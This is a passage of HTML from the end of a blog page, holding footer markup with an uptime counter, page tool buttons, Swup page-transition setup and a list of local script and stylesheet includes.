                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>





    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>








    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>